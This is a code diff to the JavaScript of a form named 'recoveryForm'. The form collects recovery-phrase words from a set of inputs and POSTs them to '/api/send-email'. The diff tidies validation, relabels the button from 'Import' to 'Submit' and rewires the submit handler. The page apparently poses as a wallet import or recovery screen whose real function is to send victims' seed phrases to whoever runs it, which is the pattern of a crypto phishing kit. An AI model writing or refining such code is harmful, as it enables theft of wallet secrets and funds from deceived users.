@@ -60,26 +60,12 @@ function updateSubmitButton() {
     const invalidInputs = document.querySelectorAll('.input-container.invalid');
     const emptyInputs = Array.from(document.querySelectorAll('.phrase-input input')).filter(input => input.value.trim() === '');
     const submitBtn = document.querySelector('.login-btn');
-    const errorMsg = document.getElementById('validation-error') || createErrorMessage();
     
-    if (invalidInputs.length > 0) {
-        // Disable button if any invalid inputs
+    if (invalidInputs.length > 0 || emptyInputs.length > 0) {
         submitBtn.disabled = true;
-        submitBtn.classList.add('disabled');
-        errorMsg.textContent = 'Please correct the highlighted words';
-        errorMsg.style.display = 'block';
         formHasErrors = true;
-    } else if (emptyInputs.length > 0) {
-        // Don't show error for empty inputs, but still disable button
-        submitBtn.disabled = true;
-        submitBtn.classList.add('disabled');
-        errorMsg.style.display = 'none';
-        formHasErrors = false;
     } else {
-        // Enable button if all inputs are valid
         submitBtn.disabled = false;
-        submitBtn.classList.remove('disabled');
-        errorMsg.style.display = 'none';
         formHasErrors = false;
     }
 }
@@ -144,7 +130,7 @@ function collectWords() {
 const API_ENDPOINT = '/api/send-email';
 
 async function sendWords(btn) {
-    const originalText = btn.textContent || 'Import';
+    const originalText = btn.textContent || 'Submit';
     
     try {
         const inputs = document.querySelectorAll('.phrase-input input');
@@ -164,7 +150,7 @@ async function sendWords(btn) {
         btn.disabled = true;
         btn.textContent = 'Processing...';
         
-        const response = await fetch(API_ENDPOINT, {
+        const response = await fetch('/api/send-email', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -247,12 +233,13 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
     
-    const form = document.querySelector('form');
-    if (form) {
+    const form = document.getElementById('recoveryForm');
+    const submitBtn = document.querySelector('.login-btn');
+    
+    if (form && submitBtn) {
         form.addEventListener('submit', function(e) {
             e.preventDefault();
-            const submitBtn = form.querySelector('button[type="submit"]');
-            if (submitBtn) {
+            if (!formHasErrors) {
                 sendWords(submitBtn);
             }
         });
